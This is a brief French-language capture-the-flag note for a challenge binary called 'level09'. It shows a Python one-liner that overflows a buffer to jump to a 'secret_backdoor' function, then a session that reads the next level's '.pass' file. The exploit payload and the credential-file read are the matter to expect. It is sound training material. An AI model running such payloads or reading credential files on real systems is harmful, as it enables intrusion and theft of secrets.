find secret_backdoor address 

(python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)') | ./level09

\x8c\x48 sont les deux derniers octets

```sh
$ (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
```

j'ai un résultat différent dans ma vm chez moi, très bizarre